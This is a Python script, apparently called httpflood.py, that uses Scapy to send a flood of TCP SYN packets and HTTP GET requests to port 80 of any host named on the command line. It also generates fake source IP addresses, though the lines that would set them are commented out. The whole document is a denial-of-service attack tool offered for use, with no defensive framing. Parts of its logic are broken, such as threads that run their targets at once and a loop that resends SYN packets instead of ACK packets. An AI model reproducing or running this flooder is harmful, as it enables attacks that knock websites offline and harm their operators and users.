from scapy.all import *
from faker import Faker
import threading
from random import *
import sys
import time

def load_agents(name):
        agentlist = []
        with open(name, 'r') as file:
              for i in file.readlines():
                    agentlist.append(i)
        return agentlist

def error(message):
        sys.exit(message)

def send_syn(pkt, synackpacketlist):
        try:
            synack=sr1(pkt, verbose = 0)
            synackpacketlist.append(synack)
        except:
                error('Invalid FQDN address')



def makesyn(src, dst):
        IPlayer = IP()
        TCPlayer = TCP()


        # IPlayer.src = src
        IPlayer.dst = dst

        TCPlayer.dport = 80
        TCPlayer.flags = 'S'
        packet = IPlayer / TCPlayer

        return packet

def makeack(src, dst, synack):
        IPlayer = IP()
        TCPlayer = TCP()
        # payload = f"GET / HTTP/1.1\r\nHost: {dst}\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: {choice(alist)}\r\n\r\n"
        payload = f"GET / HTTP/1.1\r\nHost: {dst}\r\n\r\n"
        # IPlayer.src = src
        IPlayer.dst = dst

        TCPlayer.dport = 80
        TCPlayer.flags = 'A'
        TCPlayer.sport=synack[TCP].dport
        TCPlayer.seq=synack[TCP].ack
        TCPlayer.ack=synack[TCP].seq + 1
        packet = IPlayer / TCPlayer / payload

        return packet

def flood(dst, packets, alist):
        fake = Faker()
        addrs = []
        synpacketlist = []
        synackpacketlist = []
        ackpacketlist = []

        proctime = time.process_time()

        print('generating fake ip...')
        for i in range(0, packets+1):
                s = fake.ipv4()
                addrs.append(s)

        proctime = time.process_time()-proctime
        print(f'Done in {proctime} sec')        

        print('crafting syn packets...')
        for i in range(0, packets+1):
                s = makesyn(addrs[i], dst)
                synpacketlist.append(s)

        proctime = time.process_time()-proctime
        print(f'Done in {proctime} sec')       

        print('sending syn packets...')
        for i in range(0, packets+1):
                s = threading.Thread(target= send_syn(synpacketlist[i], synackpacketlist))
                s.start()
        proctime = time.process_time()-proctime
        print(f'Done in {proctime} sec') 

        print('crafting ack packets...')
        for i in range(0, packets+1):
                ack = makeack(addrs[i], dst, synackpacketlist[i])
                ackpacketlist.append(ack)
        proctime = time.process_time()-proctime
        print(f'Done in {proctime} sec')       

        print('sending ack packets...')
        for i in range(0, packets+1):
                s = threading.Thread(target= send(synpacketlist[i], verbose = 0))
                s.start()
        proctime = time.process_time()-proctime
        print(f'Done in {proctime} sec') 




# src = str(input('src: '))
agents = load_agents('agents.txt')
if len(sys.argv) != 3:
        print("USAGE:httpflood.py <FQDN> <number of packets>")
        sys.exit(1)

dst = sys.argv[1]
packets = sys.argv[2]
try:
        packets = int(packets)
except:
        error('Invalid number of packets')

flood(dst, packets, agents)